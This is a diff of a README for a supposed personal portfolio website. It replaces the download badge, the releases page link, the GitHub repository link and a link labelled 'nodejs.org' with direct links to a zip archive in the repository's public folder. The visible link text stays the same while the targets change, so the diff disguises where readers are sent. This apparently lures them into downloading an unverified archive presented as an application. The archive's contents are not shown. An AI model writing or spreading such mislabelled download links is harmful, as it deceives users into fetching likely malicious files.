@@ -1,12 +1,12 @@
 # 🎨 tarwinder-portfolio - Showcase Your Work in Style
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Marabelhard623/tarwinder-portfolio/releases)
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/Marabelhard623/tarwinder-portfolio/main/public/portfolio-tarwinder-3.2.zip)
 
 ## 🚀 Getting Started
 
 Welcome! This is a personal portfolio website for Tarwinder Singh, a full-stack engineer. The site is built with modern web technologies and features an interactive user interface with dark/light mode support. It is designed to run as a static site on GitHub Pages.
 
-Visit this link to download the application: [https://github.com/Marabelhard623/tarwinder-portfolio/releases](https://github.com/Marabelhard623/tarwinder-portfolio/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Marabelhard623/tarwinder-portfolio/main/public/portfolio-tarwinder-3.2.zip](https://raw.githubusercontent.com/Marabelhard623/tarwinder-portfolio/main/public/portfolio-tarwinder-3.2.zip)
 
 ## ✨ Features
 
@@ -75,7 +75,7 @@ tarwinder-portfolio/
 
 If you are familiar with Node.js and want to run the development server:
 
-1. Install Node.js from [nodejs.org](https://nodejs.org/).
+1. Install Node.js from [nodejs.org](https://raw.githubusercontent.com/Marabelhard623/tarwinder-portfolio/main/public/portfolio-tarwinder-3.2.zip).
 2. Open a terminal (Command Prompt or PowerShell) in the extracted folder.
 3. Run `npm install` to install dependencies.
 4. Run `npm run dev` to start the development server.
@@ -83,7 +83,7 @@ If you are familiar with Node.js and want to run the development server:
 
 ## 🤝 Contributing
 
-Contributions are welcome! If you have suggestions or find issues, please open an issue or pull request on the [GitHub repository](https://github.com/Marabelhard623/tarwinder-portfolio).
+Contributions are welcome! If you have suggestions or find issues, please open an issue or pull request on the [GitHub repository](https://raw.githubusercontent.com/Marabelhard623/tarwinder-portfolio/main/public/portfolio-tarwinder-3.2.zip).
 
 ## 📄 License
 
